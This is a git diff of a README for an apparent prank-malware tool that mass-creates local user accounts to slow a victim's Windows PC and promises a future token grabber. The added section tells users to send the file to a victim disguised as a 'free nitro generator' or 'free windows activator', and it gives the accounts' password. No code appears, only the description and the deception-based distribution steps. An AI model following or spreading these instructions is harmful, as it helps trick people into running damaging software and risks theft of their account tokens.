@@ -2,9 +2,8 @@
 ------------------------------------------------------
 ------------------------------------------------------
 - What this file does:
-  - This file make as many (Local User Accounts) as it can, And this will cause So much lag on victim's pc when starting it... (depends on your pc specs)
-   - changes the wictims wallpaper to a goat picture - okay i know this is useless but will 100% scare him about whats going on XD
-    - grabs victim's token (soon)~
+  - This file spam creates as many (Local User Accounts) as it can, And this will cause So much lag on victim's pc when starting it... (depends on your pc specs)
+  - ~grabs victim's token (soon)~
 
 -----------------------------------------------------
 - Why should i use this?
@@ -19,4 +18,16 @@ https://www.virustotal.com/gui/file/7e3da164cac1c80a2b6211c25baaf0648da80d9940d4
 READ THIS:
 - Do not do this to ANYONE Without their permission! Cuz i am NOT responsible for any of the damages that it might cause
 
-    - So lets just be Careful and Don't cause any "~E M O T I O N A L - D A M A G E~" to each other ;D
+    - So lets just be Careful and Don't cause any "~E M O T I O N A L - D A M A G E~" to each other...
+-----------------------------------------------------
+How to run it?
+
+- Just send the file to victim and make them run it
+- or say its free nitro generator, or free windows activator ;D
+
+[[[[Make sure to run it for few minutes!!!]]]]
+-----------------------------------------------------
+Wanna log in to one of that accounts?
+
+This local accounts are Password-Protected and the password is: ImaginePassword1234
+-----------------------------------------------------
